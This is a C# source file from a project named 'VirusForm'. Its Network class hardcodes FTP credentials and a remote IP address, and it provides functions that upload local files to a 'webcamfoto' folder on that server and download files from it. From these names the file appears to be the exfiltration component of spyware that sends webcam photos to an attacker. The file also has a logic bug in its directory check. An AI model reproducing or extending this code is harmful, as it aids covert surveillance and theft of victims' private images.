using System;
using System.IO;
using System.Net;
using System.Windows.Forms;


namespace VirusForm
{
    class Network
    {
        private static string userName = "virus";
        private static string password = "virustest123";
        private static string host = "77.123.88.11";

        public static void DownloadFileFTP(string inputFileNamePath, string ftpFileName)
        {
           
                FtpWebRequest request = (FtpWebRequest)WebRequest.Create("ftp://"+host+"/"+ ftpFileName);
                request.Credentials = new NetworkCredential(userName, password);
                request.UseBinary = true; // Use binary to ensure correct dlv!
                request.Method = WebRequestMethods.Ftp.DownloadFile;
                request.UsePassive = false;

                using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
                {
                    using (Stream responseStream = response.GetResponseStream())
                    {
                        using (FileStream writer = new FileStream(inputFileNamePath + ftpFileName, FileMode.Create))
                        {

                            long length = response.ContentLength;
                            int bufferSize = 2048;
                            int readCount;
                            byte[] buffer = new byte[2048];

                            readCount = responseStream.Read(buffer, 0, bufferSize);
                            while (readCount > 0)
                            {
                                writer.Write(buffer, 0, readCount);
                                readCount = responseStream.Read(buffer, 0, bufferSize);
                            }
                        }
                    }
                }
        }

        public static bool FtpDirectoryExists(string directoryPath)
        {
            bool IsExists = true;
            try
            {
                FtpWebRequest request = (FtpWebRequest)WebRequest.Create(directoryPath);
                request.Credentials = new NetworkCredential(userName, password);
                request.Method = WebRequestMethods.Ftp.PrintWorkingDirectory;

                FtpWebResponse response = (FtpWebResponse)request.GetResponse();
            }
            catch (WebException ex)
            {
                IsExists = false;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return false;
            }
            return IsExists;
        }

        private static bool CreateFTPDirectory(string directory)
        {

            try
            {
                //create the directory
                FtpWebRequest requestDir = (FtpWebRequest)FtpWebRequest.Create(new Uri(directory));
                requestDir.Method = WebRequestMethods.Ftp.MakeDirectory;
                requestDir.Credentials = new NetworkCredential(userName, password);
                requestDir.UsePassive = true;
                requestDir.UseBinary = true;
                requestDir.KeepAlive = false;
                FtpWebResponse response = (FtpWebResponse)requestDir.GetResponse();
                Stream ftpStream = response.GetResponseStream();

                ftpStream.Close();
                response.Close();

                return true;
            }
            catch (WebException ex)
            {
                FtpWebResponse response = (FtpWebResponse)ex.Response;
                if (response.StatusCode == FtpStatusCode.ActionNotTakenFileUnavailable)
                {
                    response.Close();
                    return true;
                }
                else
                {
                    response.Close();
                    return false;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return false;
            }
           
        }

        public static void UploadFileFTP(string path, string fileName)
        {
            FileInfo objFile = new FileInfo(fileName);
            FtpWebRequest objFTPRequest;
            if (FtpDirectoryExists("ftp://" + host + "/webcamfoto/" + path + "/"))
            {
                CreateFTPDirectory("ftp://" + host + "/webcamfoto/" + path + "/");
            }
            // Create FtpWebRequest object 
              objFTPRequest = (FtpWebRequest)FtpWebRequest.Create(new Uri("ftp://" + host + "/webcamfoto/" +path +"/"+ objFile.Name));
          
            // Set Credintials
            objFTPRequest.Credentials = new NetworkCredential(userName, password);
            objFTPRequest.UsePassive = false;
            // By default KeepAlive is true, where the control connection is 
            // not closed after a command is executed.
            objFTPRequest.KeepAlive = false;

            // Set the data transfer type.
            objFTPRequest.UseBinary = true;

            // Set content length
            objFTPRequest.ContentLength = objFile.Length;

            // Set request method
            objFTPRequest.Method = WebRequestMethods.Ftp.UploadFile;

            // Set buffer size
            int intBufferLength = 16 * 1024;
            byte[] objBuffer = new byte[intBufferLength];

            // Opens a file to read
            FileStream objFileStream = objFile.OpenRead();

            try
            {
                // Get Stream of the file
                Stream objStream = objFTPRequest.GetRequestStream();

                int len = 0;

                while ((len = objFileStream.Read(objBuffer, 0, intBufferLength)) != 0)
                {
                    // Write file Content 
                    objStream.Write(objBuffer, 0, len);

                }
                objStream.Flush();
                objStream.Close();
                objFileStream.Close();
              
              
            }
            catch (Exception ex)
            {

                MessageBox.Show(ex.Message);
           }
        }

        
    }
}
